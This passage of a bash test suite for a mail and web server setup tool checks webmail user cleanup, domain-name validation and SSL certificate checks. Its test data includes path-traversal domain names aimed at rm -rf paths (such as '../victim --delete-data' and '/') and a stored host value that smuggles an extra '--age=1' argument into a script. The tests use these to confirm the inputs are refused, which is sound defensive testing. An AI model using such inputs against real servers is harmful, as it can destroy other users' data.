assert_lacks "it does not claim anybody went"                       "has forgotten" "$_wf_out"
assert_lacks "it names no mailbox that signs in"                    "live@cmd.example" "$_wf_out"
assert_lacks "and none that is switched off"                        "p@off.example" "$_wf_out"
assert_eq    "and it starts nothing and removes nobody"             ":live@cmd.example p@off.example gone@cmd.example old@nomail.example" "$(cat "$_wf/php.log"):$(_wf_left)"
# asked once, after the list; with no terminal and no --yes the answer is no
_wf_out="$(OPT_YES=0 _wf_say lib_webmail_forget_main --gone)"
assert_has   "without a yes nothing is removed, and the command says so" "Nothing was removed" "$_wf_out"
assert_has   "which is a failure, for a script to notice"           "rc=1" "$_wf_out"
assert_has   "the list came before the question"                    "        gone@cmd.example" "$_wf_out"
assert_eq    "everybody is where they were, and nothing was started" ":live@cmd.example p@off.example gone@cmd.example old@nomail.example" "$(cat "$_wf/php.log"):$(_wf_left)"
_wf_out="$(_wf_say lib_webmail_forget_main --gone)"
assert_has   "with a yes they go"                                   "rc=0" "$_wf_out"
assert_eq    "all that had no mailbox, and nobody that has one"     "live@cmd.example p@off.example" "$(_wf_left)"
assert_has   "and the command says how many"                        "The webmail has forgotten 2 address(es) that have no mailbox any more" "$_wf_out"
assert_eq    "each by Roundcube's own script, once" \
  "1.7.4|bin/deluser.sh --host=127.0.0.1 gone@cmd.example"$'\n'"1.7.4|bin/deluser.sh --host=127.0.0.1 old@nomail.example" "$(cat "$_wf/php.log")"
: >"$_wf/php.log"
_wf_out="$(_wf_say lib_webmail_forget_main --gone)"
assert_has   "asked again, it says there is nothing"                "The webmail keeps nothing for an address that has no mailbox" "$_wf_out"
assert_eq    "which is no failure, and starts nothing"              "rc=0:" "$(sed -n 1p <<<"$_wf_out"):$(cat "$_wf/php.log")"
# it removes what the list names, so it must not guess where the list will not
_wf_users live@cmd.example gone@cmd.example
mv "$MAIL_PASSWD_FILE" "$_wf/passwd.kept"
_wf_out="$(_wf_say lib_webmail_forget_main --gone)"
mv "$_wf/passwd.kept" "$MAIL_PASSWD_FILE"
assert_has   "--gone removes nobody when the mailbox file is missing" "rc=1" "$_wf_out"
assert_has   "and says that it cannot tell who is gone"             "cannot be told" "$_wf_out"
assert_eq    "not the user with a mailbox, not the one without"     ":live@cmd.example gone@cmd.example" "$(cat "$_wf/php.log"):$(_wf_left)"
: >"$_wf/db.down"
_wf_out="$(_wf_say lib_webmail_forget_main --gone)"
rm -f "$_wf/db.down"
assert_has   "a database that does not answer is a failed command"  "rc=1" "$_wf_out"
assert_has   "and not a webmail that keeps nothing"                 "The webmail's users could not be read" "$_wf_out"
# one that cannot be removed - here a stored host no host name looks like - is said, and does
# not stand in the way of those that come after it in the list
printf 'gone@cmd.example\t127.0.0.1\nbad@cmd.example\t127.0.0.1 --age=1\nlast@cmd.example\t127.0.0.1\n' >"$_wf/users.tsv"; : >"$_wf/php.log"
_wf_out="$(_wf_say lib_webmail_forget_main --gone)"
assert_eq    "one that cannot go does not keep the others, and stays" "bad@cmd.example" "$(_wf_left)"
assert_eq    "it is not handed to the script"                       "gone@cmd.example last@cmd.example" "$(sed 's/.* //' "$_wf/php.log" | tr '\n' ' ' | sed 's/ $//')"
assert_has   "it is named, with the reason"                         "bad@cmd.example is still there: Roundcube's bin/deluser.sh left 1 of 1 user(s) in place" "$_wf_out"
assert_has   "what did go is said"                                  "The webmail has forgotten 2 address(es)" "$_wf_out"
assert_has   "and so is what did not"                               "The webmail still holds what was kept there for 1 of 3 address(es)" "$_wf_out"
assert_has   "which makes it a failed command"                      "rc=1" "$_wf_out"
# uninstalled with its database kept: the list is still there to read, and nothing to remove it with
_wf_users gone@cmd.example; : >"$_wf/wm.off"
_wf_out="$(_wf_say lib_webmail_forget_main --gone)"
assert_has   "a webmail that is not installed still lists them"     "        gone@cmd.example" "$_wf_out"
assert_has   "and says, before any question, that it cannot remove them" "None of them can be removed" "$_wf_out"
assert_eq    "a failure, with nothing started"                      "rc=1:" "$(sed -n 1p <<<"$_wf_out"):$(cat "$_wf/php.log")"
assert_has   "a dry run does not promise what a real run refuses"   "rc=1" "$(OPT_DRY_RUN=1 _wf_say lib_webmail_forget_main --gone)"
rm -f "$_wf/wm.off"
assert_eq    "another word with dashes is nobody's name"            1 "$(run_isolated _wf_do lib_webmail_forget_main --all)"
assert_true  "and removed nobody"                                   _wf_has gone@cmd.example
assert_has   "--gone is in the reference"                           "webmail forget <user@domain>|@<domain>|--gone" "$(lib_usage)"

eval "$_wf_saved_vars"; eval "$_wf_saved_fn"
unset -f _wf_do _wf_run _wf_tee _wf_say _wf_users _wf_has _wf_left _wf_asked _wf_gone _wf_doc

# =============================================================================
section "a domain argument is a domain name before it is a path"
# Every command that takes a domain builds paths from it - the mail store, the alias file, the
# keys, the state directory - and several remove what they find there with rm -rf. "mail
# disable" checked nothing: "../lib --delete-data" removed /var/vmail/../lib, and "/" the whole
# mail store. "mail domain del ../../domains/<site>" removed a SITE's state directory, and
# "remove ../mail/domains/<domain>" a mail domain's record, because "is it registered?" was
# answered by whether a domain.json lay at the end of the path the name spelled.
#
# These run the real commands with the real rm, so everything they could touch is moved into
# one directory first, the section runs none of its cases if any of it is not, and rm itself
# is given a last net: nothing that resolves outside the test directory is ever removed.
_da="$TMP/domarg"; rm -rf "$_da"; mkdir -p "$_da"
_da_saved_fn="$(declare -f lib_domains_list)"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
_da_vars="STATE_DIR CRON_FILE MAIL_STATE_DIR MAIL_ALIAS_DIR MAIL_DISABLED_DIR MAIL_DOMAINS_DIR MAIL_DOMAINS_GONE_DIR MAIL_VMAIL_HOME MAIL_PASSWD_FILE MAIL_DKIM_DIR MAIL_POSTFIX_DIR MAIL_SNI_MAP MAIL_DOVECOT_DIR MAIL_RSPAMD_DIR MAIL_RSPAMD_LOMP MAIL_PW_HELPER MAIL_PW_SUDOERS BACKUP_ROOT BACKUP_KEY_FILE WM_ROOT WM_RELEASES WM_CURRENT WM_ETC WM_CONF WM_VAR WM_LOG_DIR WM_INFO WM_IDENT_MAP WM_JAIL_FILE WM_FILTER_FILE LE_LIVE CF_INI"
# shellcheck disable=SC2086
_da_saved_vars="$(declare -p $_da_vars INS_ROLE MAIL_ARG_DOMAIN)"
# the layout a server has, so that a name which climbs lands where it would land there
STATE_DIR="$_da/root/.server-setup"; CRON_FILE="$_da/etc/cron.d/lomp"
MAIL_STATE_DIR="$STATE_DIR/mail"; MAIL_ALIAS_DIR="$MAIL_STATE_DIR/aliases"; MAIL_DISABLED_DIR="$MAIL_STATE_DIR/disabled"
MAIL_DOMAINS_DIR="$MAIL_STATE_DIR/domains"; MAIL_DOMAINS_GONE_DIR="$STATE_DIR/archive/mail-domains"
MAIL_VMAIL_HOME="$_da/var/vmail"; MAIL_DKIM_DIR="$_da/var/lib/lompstack/dkim"
MAIL_DOVECOT_DIR="$_da/etc/dovecot/lomp"; MAIL_PASSWD_FILE="$MAIL_DOVECOT_DIR/passwd"
MAIL_POSTFIX_DIR="$_da/etc/postfix/lomp"; MAIL_SNI_MAP="$MAIL_POSTFIX_DIR/sni"
MAIL_RSPAMD_DIR="$_da/etc/rspamd/local.d"; MAIL_RSPAMD_LOMP="$_da/etc/rspamd/lomp"
MAIL_PW_HELPER="$_da/usr/webmail-passwd"; MAIL_PW_SUDOERS="$_da/etc/sudoers.d/lomp-webmail-passwd"
BACKUP_ROOT="$_da/var/backups/server-setup"; BACKUP_KEY_FILE="$STATE_DIR/backup.key"
WM_ROOT="$_da/var/www/lomp-webmail"; WM_RELEASES="$WM_ROOT/releases"; WM_CURRENT="$WM_ROOT/current"
WM_ETC="$_da/etc/lomp-webmail"; WM_CONF="$WM_ETC/config.inc.php"; WM_IDENT_MAP="$WM_ETC/identities.map"
WM_VAR="$_da/var/lib/lomp-webmail"; WM_LOG_DIR="$_da/var/log/lomp-webmail"; WM_INFO="$STATE_DIR/webmail.info"
WM_JAIL_FILE="$_da/etc/fail2ban/wm-jail.conf"; WM_FILTER_FILE="$_da/etc/fail2ban/wm-filter.conf"
LE_LIVE="$_da/etc/letsencrypt/live"; CF_INI="$STATE_DIR/cloudflare.ini"; INS_ROLE=""
_da_ok=1
for _v in $_da_vars SSL_DEPLOY_DIR LSWS_HOME LSWS_VHOSTS_DIR LOG_FILE SITES_ROOT SITES_LOG_ROOT TMPDIR; do
  if [[ "${!_v}" != "$TMP" && "${!_v}" != "$TMP"/* ]]; then _da_ok=0; fail "this section would work outside its directory: ${_v}=${!_v}"; fi
done
assert_eq "everything these commands can touch is inside the test directory" 1 "$_da_ok"

# What reaches outside this process is stood in for; what decides and what removes is real.
# Nothing may wait either: with a check gone, "logs" would follow a file that never comes, and
# a test that hangs tells nobody what broke.
_da_stubs='lib_mail_installed() { return 0; }
  lib_require_tools() { return 0; }
  lib_mail_tables_apply() { return 0; }
  _mail_webmail_forget() { return 0; }
  lib_cf_token() { printf ""; }
  lib_ssl_obtain_names() { printf "%s\n" "$*" >>"$_da/certbot.log"; return 1; }
  certbot() { printf "%s\n" "$*" >>"$_da/certbot.log"; return 1; }
  lib_service_active() { return 1; }
  lib_service_exists() { return 1; }
  lib_db_sql() { return 1; }
  systemctl() { return 1; }
  runuser() { return 1; }
  pkill() { return 0; }
  userdel() { return 1; }
  mysql() { return 1; }
  mariadb() { return 1; }
  doveadm() { return 1; }
  postqueue() { return 1; }
  sleep() { return 0; }
  tail() { local a=""; for a in "$@"; do case "$a" in -F|-f) return 0 ;; esac; done; command tail "$@"; }
  lib_have() { case "$1" in jq|awk|sed|grep|openssl|tar|realpath|sha256sum) command -v "$1" >/dev/null 2>&1 ;; *) return 1 ;; esac; }
  rm() {
    local a="" real=""
    for a in "$@"; do
      case "$a" in -*) continue ;; esac
      real="$(realpath -m -- "$a" 2>/dev/null || true)"
      if [[ -z "$real" || ( "$real" != "$TMP" && "$real" != "$TMP"/* ) ]]; then printf "%s\n" "$a" >>"$_da/rm-refused.log"; return 0; fi
    done
    command rm "$@"
  }'
# under run_isolated the status is the answer; what the command said is kept for the next line
_da_do()  { eval "$_da_stubs"; OPT_YES=1; "$@" >"$_da/said.txt" 2>&1 </dev/null; }
_da_said() { cat "$_da/said.txt" 2>/dev/null || true; }
# the same small server before every case: a site, a mail domain, a domain nobody here knows
# with mail on disk, and a directory beside the mail store that is nobody's mail
_da_fresh() {
  rm -rf "$_da/root" "$_da/var" "$_da/etc" "$_da/certbot.log"
  mkdir -p "$STATE_DIR/domains/site.example" "$MAIL_DOMAINS_DIR/own.example" "$MAIL_ALIAS_DIR" "$MAIL_DKIM_DIR" \
           "$MAIL_VMAIL_HOME/real.example/info/Maildir/new" "$_da/var/victim" "$MAIL_DOVECOT_DIR" "$BACKUP_ROOT"
  printf '{"installed_at":"2026-01-01T00:00:00Z","components":{"mail":{"postfix":"3.8"}},"mail":{"hostname":"mail.site.example"},"params":{}}\n' >"$STATE_DIR/manifest.json"
  printf '{"domain":"site.example","mode":"php","user":"site_example","mail":{"enabled":true,"webmail":true,"selector":"lomp202601"}}\n' >"$(lib_domain_json site.example)"
  printf 'DB_PASS=the-database-password\n' >"$STATE_DIR/domains/site.example/db.info"
  printf '{"domain":"own.example","kind":"mail","mail":{"enabled":true,"selector":"lomp202601"}}\n' >"$(lib_mail_domain_file own.example)"
  printf 'info@real.example:{BLF-CRYPT}x::::::userdb_quota_rule=*:storage=1G\n' >"$MAIL_PASSWD_FILE"
  printf 'a message\n' >"$MAIL_VMAIL_HOME/real.example/info/Maildir/new/1"
  printf 'not mail\n' >"$_da/var/victim/precious.txt"
}
# everything a refused command must leave exactly as it was: every name in the tree, and what
# every file holds
_da_snap() {
  ( cd "$_da" && { find root var etc -print; find root var etc -type f -exec cksum {} +; } 2>/dev/null | LC_ALL=C sort | cksum ) || true
}

if (( _da_ok )); then
  # ---- the commands this was found in -----------------------------------------
  _da_fresh
  assert_eq   "mail disable refuses a name that climbs out of the mail store" 1 "$(run_isolated _da_do lib_mail_main disable ../victim --delete-data)"
  assert_true "and what lies beside the mail store is still there"            test -s "$_da/var/victim/precious.txt"
  assert_has  "it says which name it will not take"                           "Invalid domain '../victim'" "$(_da_said)"
  _da_fresh
  assert_eq   "mail disable / is refused too"                                 1 "$(run_isolated _da_do lib_mail_main disable / --delete-data)"
  assert_true "and the mail store is still there, every domain of it"         test -s "$MAIL_VMAIL_HOME/real.example/info/Maildir/new/1"
  _da_fresh
  assert_eq   "mail domain del refuses a name that points at a site's state"  1 "$(run_isolated _da_do lib_mail_main domain del ../../domains/site.example --no-backup)"
  assert_true "and the site's state is still there, password and all"         test -s "$STATE_DIR/domains/site.example/db.info"
  _da_fresh
  assert_eq   "remove refuses the path of a mail domain's record"             1 "$(run_isolated _da_do lib_domain_remove_main ../mail/domains/own.example)"
  assert_true "and the record is still there"                                 test -s "$MAIL_DOMAINS_DIR/own.example/domain.json"
  assert_has  "and remove says it is the name it will not take"               "Invalid domain name '../mail/domains/own.example'" "$(_da_said)"
  assert_eq   "webmail off does not reach into another state file"            1 "$(run_isolated _da_do lib_mail_main webmail off ../domains/site.example)"
  assert_eq   "whose flag is as it was"                                       "true" "$(jq -r '.mail.webmail' "$(lib_domain_json site.example)")"
  assert_eq   "mail cert asks for no certificate under such a name"           1 "$(run_isolated _da_do lib_mail_main cert ../domains/site.example)"
  assert_false "certbot was never reached"                                    test -e "$_da/certbot.log"

  # ---- the question every command asks first ---------------------------------
  _da_fresh
  assert_true  "a site is registered"                                         lib_domain_registered site.example
  assert_false "the path of a mail domain's record is not a site"             lib_domain_registered ../mail/domains/own.example
  assert_false "nor is a name with a slash that leads back to a real site"    lib_domain_registered ../domains/site.example
  assert_true  "a mail domain is one"                                         lib_mail_domain_standalone own.example
  assert_false "the path of a site's state is not a mail domain"              lib_mail_domain_standalone ../../domains/site.example
  assert_true  "mail is on where it is on"                                    lib_mail_domain_enabled own.example
  assert_false "and for no name that is not a domain"                         lib_mail_domain_enabled ../domains/site.example
  assert_false "which is known to nobody"                                     lib_mail_domain_known ../../domains/site.example
  assert_true  "mail on disk is a trace"                                      lib_mail_domain_has_traces real.example
  assert_false "a directory reached by climbing out of the store is not"      lib_mail_domain_has_traces ../victim
  assert_false "nor is the store itself"                                      lib_mail_domain_has_traces /
  MAIL_ARG_DOMAIN=""; _mail_domain_arg "Own.Example" "lomp mail disable example.com"
  assert_eq    "the name a command is given is handed on in lower case"       "own.example" "$MAIL_ARG_DOMAIN"
  assert_eq    "no name at all is refused"                                    1 "$(run_isolated _da_do _mail_domain_arg "" "lomp mail disable example.com")"
  assert_has   "by asking for one"                                            "Which domain?" "$(_da_said)"
  assert_has   "with the command as it should have been typed"                "lomp mail disable example.com" "$(_da_said)"

  # ---- every mail command that takes a domain or an address ------------------
  # refused, and with nothing changed: not a name in the tree, not a byte in a file
  _da_fresh
  _da_before="$(_da_snap)"
  for _c in "disable ../victim" "disable ../victim --delete-data" "disable / --delete-data" "disable .. --delete-data" \
            "disable real.example/../../victim --delete-data" "disable ../domains/site.example --delete-data" \
            "domain del ../victim" "domain del ../../domains/site.example --no-backup" "domain add ../victim --mailbox info" \
            "enable ../victim --mailbox info" "dns ../domains/site.example" "dns ../domains/site.example --apply" \
            "cert ../domains/site.example" "webmail on ../domains/site.example" "webmail off ../domains/site.example" \
            "dkim status ../domains/site.example" "dkim rotate ../domains/site.example" "dkim rotate ../domains/site.example --abort" \
            "backup ../victim" "restore ../victim" "restore ../victim --file /nonexistent" \
            "box list ../victim" "alias list ../victim" "box add info@../victim" "box del info@../victim" \
            "alias add a@../victim info@real.example" "alias del @../victim"; do
    read -r -a _ca <<<"$_c"
    assert_eq  "refused: mail ${_c}" 1 "$(run_isolated _da_do lib_mail_main "${_ca[@]}")"
    # by the check on the name itself, not further down by something that failed to find it
    assert_has "as no name at all: mail ${_c}" "Invalid " "$(_da_said)"
  done
  assert_eq   "and after all of them nothing on the server has changed" "$_da_before" "$(_da_snap)"
  # The site commands only ever asked "is it registered?", and that question now answers no to
  # such a name by itself. But "Site example.com/ is not registered" reads as if the site had
  # gone missing, so each of them says first that the name is none. The words are what is
  # checked here: with a command's own check gone, the lookup behind it still ends it with 1.
  for _c in "lib_backup_main ../mail/domains/own.example" "lib_domain_credentials_main ../mail/domains/own.example" \
            "lib_domain_logs_main ../mail/domains/own.example" "lib_proxy_add ../mail/domains/own.example /api/ 127.0.0.1:3001" \
            "lib_proxy_remove ../mail/domains/own.example /api/" "lib_proxy_list ../mail/domains/own.example" \
            "lib_app_main status ../mail/domains/own.example" "lib_harden_main ../mail/domains/own.example"; do
    read -r -a _ca <<<"$_c"
    assert_eq  "refused: ${_c}" 1 "$(run_isolated _da_do "${_ca[@]}")"
    assert_has "as no name at all: ${_ca[0]}" "Invalid domain name '../mail/domains/own.example'" "$(_da_said)"
  done
  # what the shell's completion makes of a site typed in /home
  assert_eq   "a site's name with a slash after it is no name either"   1 "$(run_isolated _da_do lib_domain_remove_main site.example/)"
  assert_has  "and is not reported as a site that has gone missing"     "Invalid domain name 'site.example/'" "$(_da_said)"
  assert_eq   "restore takes no such name either"                       1 "$(run_isolated _da_do lib_restore_main ../victim --file /nonexistent)"
  assert_has  "and says it is the name, not the archive"                "Invalid domain name '../victim'" "$(_da_said)"
  assert_eq   "still nothing has changed"                               "$_da_before" "$(_da_snap)"

  # ---- a site whose name is no domain name -----------------------------------
  # "restore" registered a site under whatever name it was given until 1.0.87, and such a site
  # is still a site. What the check is for is a name that leads somewhere else, and one path
  # component of letters, digits, dots, dashes and underscores leads nowhere. Asking for a
  # domain name instead made that site one no command would back up, show or remove - and the
  # nightly "backup --all" a failure for as long as it was there.
  for _n in "a/b" "../x" "/" "." ".." ".hidden" "-rf" "a b" "a;b" 'a$b' "a'b" 'a"b' $'a\nb' "a*" "ends." "ends-" "ends_" ""; do
    assert_false "no name for a site: [${_n}]" lib_domain_name_safe "$_n"
  done
  for _n in "example.com" "sub.example.co.uk" "xn--80ak6aa92e.com" "staging" "shop_old" "shop.old-2" "a"; do
    assert_true "a name a site can have: [${_n}]" lib_domain_name_safe "$_n"
  done
  _da_fresh
  mkdir -p "$STATE_DIR/domains/shop_old" "$SITES_ROOT/shop_old/public_html" "$MAIL_VMAIL_HOME/shop_old"
  printf '{"domain":"shop_old","ident":"shop_old","user":"shop_old","group":"shop_old","mode":"static"}\n' >"$(lib_domain_json shop_old)"
  printf 'a page\n' >"$SITES_ROOT/shop_old/public_html/index.html"
  assert_false "a name with an underscore in it is no domain name"         lib_domain_valid shop_old
  assert_true  "a site registered under one is a site all the same"        lib_domain_registered shop_old
  assert_true  "and may be called by that name"                            lib_domain_arg_ok shop_old
  assert_false "a name of that kind which no site has is not taken"        lib_domain_arg_ok shop_new
  assert_false "nor a path, whatever lies at the end of it"                lib_domain_arg_ok ../mail/domains/own.example
  assert_false "nor a site's own name with a slash after it"               lib_domain_arg_ok site.example/
  assert_true  "a domain name is taken whether or not it is a site"        lib_domain_arg_ok nosuch.example
  # where two domains must not go by one name it counts like any site: a mail domain with the
  # same identifier - shop.old - finds this one in its way and is given a name of its own
  assert_eq    "and it stands in the way of a mail domain of its identifier" "shop_old" "$(_mail_ident_owner "$(lib_domain_ident shop.old)" shop.old)"
  # each command is stopped at the first thing it does with a site it has accepted
  _da_do_site() {
    eval "$_da_stubs"
    eval 'lib_domain_state_load() { printf "took the site %s\n" "$1"; exit 7; }
          lib_ols_is_installed() { return 0; }; lib_system_profile() { :; }; lib_ols_change_begin() { OLS_PENDING_RELOAD=0; }'
    OPT_YES=1; "$@" >"$_da/said.txt" 2>&1 </dev/null
  }
  for _c in "lib_domain_remove_main shop_old" "lib_backup_main shop_old" "lib_domain_credentials_main shop_old" \
            "lib_proxy_add shop_old /api/ 127.0.0.1:3001" "lib_proxy_remove shop_old /api/" \
            "lib_app_main status shop_old" "lib_harden_main shop_old"; do
    read -r -a _ca <<<"$_c"
    assert_eq  "taken: ${_c}" 7 "$(run_isolated _da_do_site "${_ca[@]}")"
    assert_has "as the site it is: ${_ca[0]}" "took the site shop_old" "$(_da_said)"
  done
  assert_eq    "logs follows its log"                                      0 "$(run_isolated _da_do_site lib_domain_logs_main shop_old)"
  assert_has   "by its name"                                               "/shop_old/" "$(_da_said)"
  assert_eq    "proxy list takes it"                                       0 "$(run_isolated _da_do_site lib_proxy_list shop_old)"
  assert_lacks "without a word about its name"                             "Invalid domain name" "$(_da_said)"
  assert_eq    "restore takes it as far as the archive"                    1 "$(run_isolated _da_do_site lib_restore_main shop_old --file /nonexistent)"
  assert_has   "which is what is missing here"                             "Archive not found" "$(_da_said)"
  assert_eq    "but makes no new site under a name of that kind"           1 "$(run_isolated _da_do_site lib_restore_main shop_new --file /nonexistent)"
  assert_has   "that still takes a domain name"                            "Invalid domain name 'shop_new'" "$(_da_said)"
  # all of one command, the one the nightly run starts for every site it lists
  assert_eq    "such a site is backed up by its name"                      0 "$(run_isolated _da_do lib_backup_main shop_old)"
  assert_true  "into an archive of its own"                                bash -c "compgen -G '${BACKUP_ROOT}/shop_old/shop_old-[0-9]*.tar.gz' >/dev/null"
  # ...and put back from that archive under the name it has. (This section's stand-ins refuse
  # every change of user; for this one run the files are unpacked by whoever runs the suite,
  # as everywhere else.)
  _da_do_restore() {
    eval "$_da_stubs"
    eval 'runuser() { [[ "${1:-}" == "-u" && -n "${2:-}" && "${3:-}" == "--" ]] || return 1; shift 3; "$@"; }'
    OPT_YES=1; "$@" >"$_da/said.txt" 2>&1 </dev/null
  }
  _da_arch="$(compgen -G "${BACKUP_ROOT}/shop_old/shop_old-[0-9]*.tar.gz" | head -n 1 || true)"
  printf 'changed since\n' >"$SITES_ROOT/shop_old/public_html/index.html"
  assert_eq    "and restored from it, into the site that is there"         0 "$(run_isolated _da_do_restore lib_restore_main shop_old --file "$_da_arch")"
  assert_eq    "with what the archive held"                                "a page" "$(cat "$SITES_ROOT/shop_old/public_html/index.html")"
  # the mail restore takes no such name, and a site under one never had mail: it is not asked
  assert_lacks "and no complaint about mail it never had"                  "was not restored" "$(_da_said)"
  unset -f _da_do_restore
  # What makes something new, and everything about mail, still wants a domain name: the mail
  # store is where a name was once taken for a path, and nothing there is looser than it was.
  for _c in "lib_domain_add_main shop_old --no-ssl" "lib_ssl_renew_main shop_old" "lib_mail_main enable shop_old" \
            "lib_mail_main disable shop_old --delete-data" "lib_mail_main domain add shop_old" "lib_mail_main backup shop_old"; do
    read -r -a _ca <<<"$_c"
    assert_eq  "still refused: ${_c}" 1 "$(run_isolated _da_do "${_ca[@]}")"
    assert_has "as no domain name: ${_c}" "Invalid domain" "$(_da_said)"
  done
  assert_false "a directory of that name in the mail store is nobody's mail" lib_mail_domain_has_traces shop_old
  assert_eq    "and the purge will not have it"                            1 "$(run_isolated _da_do lib_mail_domain_purge shop_old)"
  assert_true  "it is still there"                                         test -d "$MAIL_VMAIL_HOME/shop_old"
  rm -rf "$SITES_ROOT/shop_old"
  unset -f _da_do_site

  # ---- the last check, for a caller that forgot the first ---------------------
  _da_fresh
  assert_eq   "the purge itself refuses what is not a domain name"      1 "$(run_isolated _da_do lib_mail_domain_purge ../victim)"
  assert_true "and removes nothing"                                     test -s "$_da/var/victim/precious.txt"
  assert_eq   "nor the whole store"                                     1 "$(run_isolated _da_do lib_mail_domain_purge /)"
  assert_true "which is still there"                                    test -s "$MAIL_VMAIL_HOME/real.example/info/Maildir/new/1"
  assert_eq   "a record is not made under such a name either"           1 "$(run_isolated _da_do lib_mail_domain_register ../victim)"
  assert_false "there is none"                                          test -e "$MAIL_DOMAINS_DIR/../victim/domain.json"
  assert_eq   "and nothing is restored under one"                       1 "$(run_isolated _da_do lib_mail_restore_domain ../victim)"
  # A mailbox line is read back from the password file as it stands, and a restore writes that
  # file from an archive. Its address becomes a path too.
  _da_fresh
  printf '../../victim@real.example:{BLF-CRYPT}x::::::userdb_quota_rule=*:storage=1G\n' >>"$MAIL_PASSWD_FILE"
  assert_eq   "a domain whose password file holds a line that is no address is still purged" 0 "$(run_isolated _da_do lib_mail_main disable real.example --delete-data)"
  assert_true "what that line pointed at is still there"                test -s "$_da/var/victim/precious.txt"
  assert_eq   "the line itself is gone"                                 0 "$(grep -c 'victim' "$MAIL_PASSWD_FILE" || true)"
  assert_false "and so is the domain's own mail"                        test -e "$MAIL_VMAIL_HOME/real.example"

  # ---- and the commands still do what they are for ----------------------------
  _da_fresh
  assert_eq   "a real domain's mail is deleted when that is asked for"  0 "$(run_isolated _da_do lib_mail_main disable Real.Example --delete-data)"
  assert_false "all of it"                                              test -e "$MAIL_VMAIL_HOME/real.example"
  assert_eq   "its mailbox line too"                                    0 "$(grep -c 'real.example' "$MAIL_PASSWD_FILE" || true)"
  assert_true "and nothing beside it"                                   test -s "$_da/var/victim/precious.txt"
  # the flag that says "off" belongs in the record the domain has: one that has none must not
  # be given a state file for it, because that file alone is what makes a name a site here
  assert_false "a domain nobody here knows is not made a site on the way" test -e "$STATE_DIR/domains/real.example"
  _da_fresh
  assert_eq   "without --delete-data its mailboxes are put aside"       0 "$(run_isolated _da_do lib_mail_main disable real.example)"
  assert_true "under the name it has"                                   test -s "$MAIL_DISABLED_DIR/real.example.passwd"
  assert_true "with the mail left where it is"                          test -s "$MAIL_VMAIL_HOME/real.example/info/Maildir/new/1"
  assert_false "and it is no site afterwards either"                    lib_domain_registered real.example
  _da_fresh
  assert_eq   "a site's mail is turned off by its name"                 0 "$(run_isolated _da_do lib_mail_main disable site.example)"
  assert_eq   "and the flag goes into the site's own record"            "false" "$(jq -r '.mail.enabled' "$(lib_domain_json site.example)")"
  _da_fresh
  assert_eq   "a mail domain is removed by its name"                    0 "$(run_isolated _da_do lib_mail_main domain del Own.Example --no-backup)"
  assert_false "its record is gone"                                     test -e "$MAIL_DOMAINS_DIR/own.example"
  assert_true "and archived"                                            bash -c "compgen -G '${MAIL_DOMAINS_GONE_DIR}/own.example.[0-9]*' >/dev/null"
  assert_true "the site beside it was not touched"                      test -s "$STATE_DIR/domains/site.example/db.info"
  assert_false "no removal ever reached outside the test directory"     test -e "$_da/rm-refused.log"
fi

eval "$_da_saved_vars"; eval "$_da_saved_fn"
unset -f _da_do _da_said _da_fresh _da_snap

section "ssl: which certificates there are, and whether they renew by themselves"
# "Is there a certificate" has three answers that look alike from outside and are not: one a
# client accepts, one it refuses (self-signed, staging, the wrong names, expired), and one it
# accepts today that nothing will renew. Cloudflare's Full (strict) turns the second into a 526.
_sc="$TMP/sslcheck"; mkdir -p "$_sc"
_sc_saved_vars="$(declare -p SSL_DEPLOY_DIR LE_LIVE LE_RENEWAL LE_LOG CRON_FILE CERTBOT_DEPLOY_HOOK OPT_QUIET)"
_sc_saved_fn="$(declare -f systemctl lib_domains_list lib_domain_state_load lib_mail_installed lib_server_mail_only \
  lib_require_tools lib_require_installed lib_have lib_ssl_days_left lib_systemctl lib_service_active lib_service_exists lib_notify_send || true)"
SSL_DEPLOY_DIR="$_sc/deploy"; LE_LIVE="$_sc/live"; LE_RENEWAL="$_sc/renewal"; LE_LOG="$_sc/letsencrypt.log"
CRON_FILE="$_sc/cron"; CERTBOT_DEPLOY_HOOK="$_sc/hook.sh"; OPT_QUIET=0
mkdir -p "$SSL_DEPLOY_DIR" "$LE_LIVE" "$LE_RENEWAL"

# a CA of the given organisation signs a certificate for the names, as Let's Encrypt would
_sc_mk() {   # dir issuer-org days name...
  local dir="$1" org="$2" days="$3" san="" n=""
  shift 3
  for n in "$@"; do san+="${san:+,}DNS:${n}"; done
  mkdir -p "$dir"
  MSYS2_ARG_CONV_EXCL='/O=' openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes -days 365 \
    -keyout "$_sc/ca.key" -out "$_sc/ca.pem" -subj "/O=${org}/CN=Test CA" >/dev/null 2>&1
  MSYS2_ARG_CONV_EXCL='/CN=' openssl req -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 -nodes \
    -keyout "$dir/privkey.pem" -out "$_sc/leaf.csr" -subj "/CN=${1}" >/dev/null 2>&1
  printf 'subjectAltName=%s\n' "$san" >"$_sc/ext.cnf"
  openssl x509 -req -in "$_sc/leaf.csr" -CA "$_sc/ca.pem" -CAkey "$_sc/ca.key" -CAcreateserial \
    -days "$days" -extfile "$_sc/ext.cnf" -out "$dir/fullchain.pem" >/dev/null 2>&1
}
_sc_tee() { "$@" >"$_sc/out" 2>&1; }

if lib_have openssl; then
  _sc_mk "$SSL_DEPLOY_DIR/a.test" "Let's Encrypt" 60 a.test www.a.test
  : >"$LE_RENEWAL/a.test.conf"; printf 'x\n' >"$LE_RENEWAL/a.test.conf"
  _r="$(lib_ssl_lineage_check a.test a.test www.a.test)"
  assert_has  "a certificate a CA signed, with a renewal file, is fine"   "OK|" "$_r"
  assert_has  "it is trusted, and the issuer is named"                   "|1|Let's Encrypt" "$_r"
  assert_has  "a name it lacks is a failure"                             "FAIL|" "$(lib_ssl_lineage_check a.test a.test mail.a.test)"
  assert_has  "which names the name, and is not trusted"                 "|0|does not cover mail.a.test" "$(lib_ssl_lineage_check a.test a.test mail.a.test)"
  rm -f "$LE_RENEWAL/a.test.conf"
  _r="$(lib_ssl_lineage_check a.test a.test)"
  assert_has  "without certbot's renewal file it will not renew"         "FAIL|" "$_r"
  assert_has  "though a client accepts it today"                         "|1|certbot has no renewal file" "$_r"
  printf 'x\n' >"$LE_RENEWAL/a.test.conf"

  _sc_mk "$SSL_DEPLOY_DIR/stg.test" "(STAGING) Let's Encrypt" 60 stg.test
  printf 'x\n' >"$LE_RENEWAL/stg.test.conf"
  assert_has  "a staging certificate is one nobody trusts"               "|0|a Let's Encrypt staging" "$(lib_ssl_lineage_check stg.test stg.test)"

  mkdir -p "$SSL_DEPLOY_DIR/self.test"
